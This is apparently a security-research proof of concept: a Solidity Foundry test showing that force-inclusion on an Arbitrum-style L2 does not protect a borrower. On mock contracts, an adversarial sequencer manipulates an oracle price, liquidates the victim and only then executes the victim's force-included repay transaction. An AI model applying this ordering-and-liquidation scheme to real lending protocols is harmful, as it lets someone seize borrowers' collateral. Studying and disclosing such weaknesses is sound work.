// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title InclusionWithoutOutcome
 * @notice C2 PoC: demonstrates that force-inclusion does NOT guarantee execution
 *         outcome on Arbitrum-style L2s.
 *
 * Self-contained (no Aave V3 fork dependency): deploys MockOracle + MockLending
 * locally so the attack scenario runs deterministically.
 *
 * Arbitrum structural context (from nitro-contracts audit):
 *   - SequencerInbox.forceInclusion() is callable by ANYONE after 24 h
 *   - addSequencerL2BatchImpl() has NO ordering constraint for force-included txs
 *   - Sequencer can freely prepend adversarial txs before the force-included tx
 *
 * Attack sequence (ordering chosen by adversarial sequencer):
 *   [1] adversary:  oracle.setPrice(WETH_price * 75 / 100)   <- price drop -25%
 *   [2] adversary:  lending.liquidate(victim, debtToCover)
 *   [3] victim:     lending.repay(debt)                      <- FORCE-INCLUDED tx
 *
 * Result:
 *   Force-inclusion: SUCCESS  (victim's tx IS in the L2 block)
 *   Victim outcome:  FAIL     (liquidated before rescue tx executed)
 *
 * Run:
 *   forge test --match-test test_InclusionWithoutOutcome -vvv
 *   (no --fork-url needed: self-contained)
 */

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/MockOracle.sol";
import "../src/MockLending.sol";

contract InclusionWithoutOutcomeTest is Test {

    MockOracle  oracle;
    MockLending lending;

    address victim    = makeAddr("victim");
    address adversary = makeAddr("adversary");

    // Attack parameters
    uint256 constant WETH_PRICE_OPEN   = 2000e18;  // $2000 / WETH
    uint256 constant WETH_PRICE_ATTACK = 1500e18;  // $1500 / WETH (-25%)
    uint256 constant VICTIM_COLLATERAL = 5 ether;  // 5 WETH deposited
    // Borrow at ~90% of LT: 5 WETH * $2000 * 80% * 90% = $7200 USDC
    uint256 constant VICTIM_BORROW     = 7_200e6;  // 7200 USDC (6 dec)
    // Liquidator covers 50% of debt
    uint256 constant LIQUIDATE_AMOUNT  = 3_600e6;  // 3600 USDC

    // Measurement
    uint256 victimHFBefore;
    uint256 victimHFAfterDrop;
    uint256 adversaryWETHBefore;
    uint256 adversaryWETHAfter;

    function setUp() public {
        oracle  = new MockOracle(WETH_PRICE_OPEN);
        lending = new MockLending(address(oracle));

        vm.label(address(oracle),  "MockOracle");
        vm.label(address(lending), "MockLending");
        vm.label(victim,           "Victim");
        vm.label(adversary,        "Adversary");

        // Pre-credit collateral to MockLending (simulates WETH held by victim)
        // In a real lending protocol the victim would have transferred WETH in.
        // Here we set state directly to focus on the ordering attack.
        vm.prank(victim);
        lending.supply(VICTIM_COLLATERAL);

        vm.prank(victim);
        lending.borrow(VICTIM_BORROW);

        // Give adversary ETH for gas
        vm.deal(adversary, 10 ether);
    }

    function test_InclusionWithoutOutcome() public {

        // ════════════════════════════════════════════════════════════════════
        // Verify initial state
        // ════════════════════════════════════════════════════════════════════
        victimHFBefore = lending.healthFactor(victim);
        console.log("\n=== INITIAL STATE ===");
        console.log("WETH price (USD, 18 dec):", WETH_PRICE_OPEN);
        console.log("Victim collateral (wei): ", VICTIM_COLLATERAL);
        console.log("Victim debt (USDC 1e6):  ", VICTIM_BORROW);
        console.log("Victim HF (1e18 = 1.0):  ", victimHFBefore);

        assertGt(victimHFBefore, 1e18, "Initial HF must be > 1.0");
        assertLt(victimHFBefore, 1.25e18, "Initial HF must be near liquidation threshold");

        // ════════════════════════════════════════════════════════════════════
        // PHASE 2 — Victim submits force-inclusion rescue tx
        // ════════════════════════════════════════════════════════════════════
        //
        // Real Arbitrum sequence:
        //   T=0:   Victim calls DelayedInbox.sendL2Message(repay(7200 USDC)) on L1
        //   T+24h: SequencerInbox.forceInclusion() called by anyone -> tx IS included
        //
        // The adversarial sequencer receives the force-inclusion signal and
        // constructs a batch that places victim's tx LAST:
        //
        //   BATCH = [oracle.setPrice(1500e18), liquidate(victim), repay(victim)]
        //
        // We simulate exactly this ordering below.
        // ════════════════════════════════════════════════════════════════════

        console.log("\n=== ADVERSARIAL BATCH (sequencer ordering) ===");
        console.log("Force-inclusion confirmed: victim repay() IS in this block");
        console.log("Adversarial sequencer places it LAST");

        // ── [1] Adversary tx: oracle price drop ─────────────────────────────
        vm.prank(adversary);
        oracle.setPrice(WETH_PRICE_ATTACK);

        victimHFAfterDrop = lending.healthFactor(victim);
        console.log("\n  [1] adversary: oracle.setPrice($1500) [-25%]");
        console.log("      Victim HF after drop:", victimHFAfterDrop);

        assertLt(victimHFAfterDrop, 1e18, "Price drop must make victim liquidatable");

        // ── [2] Adversary tx: liquidate victim ──────────────────────────────
        adversaryWETHBefore = lending.collateral(adversary);

        vm.prank(adversary);
        lending.liquidate(victim, LIQUIDATE_AMOUNT);

        adversaryWETHAfter = lending.collateral(adversary);
        uint256 wethSeized = adversaryWETHAfter - adversaryWETHBefore;

        console.log("\n  [2] adversary: lending.liquidate(victim, 3600 USDC)");
        console.log("      WETH seized (wei):    ", wethSeized);
        console.log("      WETH seized (finney): ", wethSeized / 1e15);

        assertGt(wethSeized, 0, "Adversary must seize WETH");

        // ── [3] Victim's force-included rescue tx (arrives too late) ────────
        vm.prank(victim);
        lending.repay(VICTIM_BORROW);
        console.log("\n  [3] victim: lending.repay() [force-included tx] -- too late");

        // ════════════════════════════════════════════════════════════════════
        // RESULTS
        // ════════════════════════════════════════════════════════════════════

        uint256 wethPriceAtAttack  = WETH_PRICE_ATTACK;
        uint256 victimRemainingCol = lending.collateral(victim);
        uint256 collateralLost     = VICTIM_COLLATERAL - victimRemainingCol;

        // Adversary profit in USD
        // seizedWETH at attack price, minus USDC spent repaying debt
        uint256 advProfitUSD_1e18 = wethSeized * wethPriceAtAttack / 1e18
                                    - LIQUIDATE_AMOUNT * 1e12;

        console.log("\n==============================================");
        console.log("RESULTS");
        console.log("==============================================");
        console.log("Force-inclusion succeeded:       YES");
        console.log("Victim liquidated before rescue: YES");
        console.log("----------------------------------------------");
        console.log("WETH price at open  ($, 18dec):", WETH_PRICE_OPEN);
        console.log("WETH price at attack($, 18dec):", wethPriceAtAttack);
        console.log("Victim HF at open   (1e18=1.0):", victimHFBefore);
        console.log("Victim HF at attack (1e18=1.0):", victimHFAfterDrop);
        console.log("----------------------------------------------");
        console.log("Adversary WETH seized    (wei):", wethSeized);
        console.log("Adversary net profit  (USD*1e6):", advProfitUSD_1e18 / 1e12);
        console.log("Victim collateral lost   (wei):", collateralLost);
        console.log("==============================================");
        console.log("[PASS] inclusion != outcome");
        console.log("Force-included repay() executed;");
        console.log("victim was already liquidated.");
        console.log("==============================================");

        // ── Core assertions ─────────────────────────────────────────────────
        // The force-included tx executed (lending.repay ran without revert)
        // but the victim was already liquidated — outcome failed
        assertGt(wethSeized,        0,    "adversary must profit from liquidation");
        assertGt(collateralLost,    0,    "victim must lose collateral");
        assertLt(victimHFAfterDrop, 1e18, "victim must be liquidatable after price drop");
        // Adversary profit > 0 confirms the economic incentive exists
        assertGt(advProfitUSD_1e18, 0,    "adversary net profit must be positive");
    }
}
